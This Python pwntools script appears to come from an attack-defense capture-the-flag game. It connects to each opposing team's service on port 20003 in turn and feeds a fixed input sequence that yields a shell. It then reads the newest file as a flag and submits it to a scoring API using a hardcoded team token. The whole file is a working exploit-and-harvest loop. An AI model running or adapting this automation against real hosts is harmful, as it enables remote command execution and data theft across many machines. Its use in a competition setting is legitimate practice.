#!/usr/bin/python
from pwn import *
from api import *
import time

teamToken = "sEek7pgZDmYYwEbTzi4K1CwxrjCZ5H7p"
gameIp = "http://52.52.219.26/"
api = ProjectCTFAPI(gameIp, teamToken)

context(arch = 'i386', os = 'linux')
context.log_level = 'WARN'
i = 22
while True:
        while i > 0:
                try:
                        r = remote("team" + str(i), 20003, timeout=4)
                        r.recvuntil(">")
                        r.sendline("1")
                        r.recvuntil("backup:")
                        r.sendline("s")
                        r.recvuntil("backup:")
                        r.sendline("s")
                        r.recvuntil("saving.")
                        r.sendline("5")
                        r.sendline("ls -lat")
                        files = r.recvuntil("Hello,")
                        files = files.split("\n")
                        f = files[4].split(" ")
                        r.recvuntil(">")
                        r.sendline("1")
                        r.recvuntil("backup:")
                        r.sendline("s")
                        r.recvuntil("backup:")
                        r.sendline("s")
                        r.recvuntil("saving.")
                        r.sendline("5")
                        r.sendline("/bin/sh")
                        r.sendline("cat " + f[-1] + ";echo \"sachin\"")
                        flag = r.recvuntil("sachin")
                        print "team" + str(i), flag[1:-6], api.submitFlag(flag[1:-6])
                        i += 1
                        r.close()
                except:
                        print "Error"
                        i -= 1
                        r.close()
        i = 22
